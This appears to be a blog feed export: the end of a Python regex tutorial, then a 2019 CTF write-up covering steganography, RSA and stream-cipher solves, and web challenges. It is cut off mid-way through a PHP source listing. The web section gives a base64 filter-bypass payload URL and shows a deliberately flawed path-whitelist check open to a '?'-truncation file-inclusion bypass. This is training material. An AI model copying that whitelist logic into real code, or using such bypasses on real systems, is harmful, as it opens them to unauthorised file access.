(<span class="string">'/3.mp3'</span>, <span class="string">'齐秦'</span>, <span class="string">'往事随风'</span>), (<span class="string">'/4.mp3'</span>, <span class="string">'beyond'</span>, <span class="string">'光辉岁月'</span>), (<span class="string">'/5.mp3'</span>, <span class="string">'程慧玲'</span>, <span class="string">'记事本'</span>), (<span class="string">'/6.mp3'</span>, <span class="string">'邓丽君'</span>, <span class="string">'但愿人长久'</span>)]</span><br><span class="line">/<span class="number">2</span><span class="selector-class">.mp3</span> 任贤齐 沧海一声笑</span><br><span class="line">/<span class="number">3</span><span class="selector-class">.mp3</span> 齐秦 往事随风</span><br><span class="line">/<span class="number">4</span><span class="selector-class">.mp3</span> beyond 光辉岁月</span><br><span class="line">/<span class="number">5</span><span class="selector-class">.mp3</span> 程慧玲 记事本</span><br><span class="line">/<span class="number">6</span><span class="selector-class">.mp3</span> 邓丽君 但愿人长久</span><br></pre></td></tr></table></figure><h4 id="9-sub-方法-去除匹配的字符"><a href="#9-sub-方法-去除匹配的字符" class="headerlink" title="9.sub()方法, 去除匹配的字符"></a>9.sub()方法, 去除匹配的字符</h4><p>第二个参数是两个’，表示吧’\d+‘ 匹配的内容替换成空，如果写sub(’\d+’, ‘?’), 则把匹配的内容替换成 ?。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'54abc59de335f7778888g'</span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??<span class="keyword">de</span>???f???????<span class="keyword">g</span></span><br><span class="line">?abc?<span class="keyword">de</span>?f?<span class="keyword">g</span></span><br></pre></td></tr></table></figure><p>有点像replace，但是多一个正则关系匹配</p><h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>在需要匹配相同正则表达式情况下, 事先定义一个compile可以简化代码量, 同时compile中也可以使用修饰符re.S等.</p><p>( 其实也可以直接a=rule，然后 result = re.findall(a,string) ,但是这样子就不能用修饰符re.S了)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = '2016-1-1 12:01'</span><br><span class="line">content2 = '2017-1-1 12:02'</span><br><span class="line">content3 = '2018-1-1 12:03'</span><br><span class="line"></span><br><span class="line">pattern = re.compile('\d&#123;2&#125;:\d&#123;2&#125;')</span><br><span class="line">result1 = re.sub(pattern, '', content1)</span><br><span class="line">result2 = re.sub(pattern, '', content2)</span><br><span class="line">result3 = re.sub(pattern, '', content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2016</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2017</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2018</span><span class="number">-1</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><p>附一手去除列表空元素的方法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [<span class="selector-tag">i</span> <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> test <span class="keyword">if</span> <span class="selector-tag">i</span> != <span class="string">''</span>]</span><br></pre></td></tr></table></figure><h3 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h3><p>这里记一下从从Li4n0学长脚本中发现的字符表替换函数：<strong>maketrans()</strong></p><p>语法：str.maketrans(intab, outtab)</p><p>参数：</p><p>intab – 字符串中要替代的字符组成的字符串</p><p>outtab – 相应的映射字符的字符串。</p><p>配合str.translate使用</p><p>实例</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"4310U"</span></span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"this is string example....wow!!!"</span></span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s <span class="number">1</span>s str1ng <span class="number">3</span>x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure><hr><p>参考资料：</p><p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p><p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 赛博杯</title>
      <link href="/2019/07/15/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/"/>
      <url>/2019/07/15/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://xz.aliyun.com/t/5648" target="_blank" rel="noopener">先知社区</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" alt="img"></a></p><p>扫条形码得到flag。</p><h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snow加密，将文件放入010editor看他的十六进制形式，<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" alt="img"></a></p><p>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</p><h3 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h3><p>题目介绍：大家都用着我们的数字杭电（i.hdu.edu.cn)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱<br>flag形式为：flag{你找到的电子邮箱}</p><p>百度一个IP反查询工具，Whois查询，看看这个IP的备案，<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" alt="img"></a></p><p>得到flag；</p><h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" alt="img"></a></p><p>第一张是可见的，应该没用，剩下来的，按顺序看。<br>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：<br>d2abd3fb9d4c93fb064abf81f5fab84<br>新手村钥匙<br>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是outguess加密，<br>outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84<br>得到文件<br>95cca6c50e48e86c468ee329ddc11047</p><p>最后一关大门的钥匙<br>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</p><h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hint：PIL是个好东西<br>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" alt="img"></a><br>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，<br>构造脚本如下</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">"f1.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">"f2.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>=im.<span class="built_in">size</span>[<span class="number">0</span>]  #图片宽</span><br><span class="line"></span><br><span class="line"><span class="built_in">height</span>=im.<span class="built_in">size</span>[<span class="number">1</span>] #图片高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> x in range(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span> y in range(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span>(data!=<span class="number">255</span> <span class="keyword">or</span> data2!=<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">            dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> i in range (<span class="keyword">int</span>(len(dd)/<span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = dd[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = <span class="keyword">int</span>(<span class="keyword">word</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(<span class="keyword">int</span>(<span class="keyword">word</span>))</span><br><span class="line"></span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1)%<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= <span class="string">'='</span>*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">write</span>(flag)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" alt="img"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件<br>openssl rsa -pubin -text -modulus -in public.pem<br>得到<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" alt="img"></a></p><p>其中。N=&gt;Modulus，e=&gt;Exponent<br>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，再用openssl解密flag.enc，得到字符串<br>}Y!s04tEP{ygraCl_f<br>栅栏加方向即可得到flag，<br>rsatool和openssl的使用参考<br><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p><h3 id="川流不息"><a href="#川流不息" class="headerlink" title="川流不息"></a>川流不息</h3><p>题目加密脚本和密文<br>加密脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> parameters import <span class="keyword">a</span></span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure><p>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">a</span>=[i,j,k,p,q]</span><br><span class="line">                        <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">                        <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">                            <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">                            <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">result</span>==key:</span><br><span class="line">                            print(<span class="keyword">a</span>)</span><br><span class="line">                            break</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">"flag&#123;"</span></span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br></pre></td></tr></table></figure><p>得到a=[1, 0, 0, 1, 0]<br>然后根据加密脚本，获得key。然后key与密文异或得到flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">a</span>=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    cipher = <span class="string">'111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(cipher))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>)),<span class="keyword">end</span>=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" alt="img"></a></p><p>输入<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn</a><br>得到回显<br>不能输入bXlmbGFn！<br>但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，<br>最终payload：<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn1" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn1</a><br>得到flag</p><h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>进入网站，f12，发现注释：<br>进入sorce.php发现源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = urldecode($page);</span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $_page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span 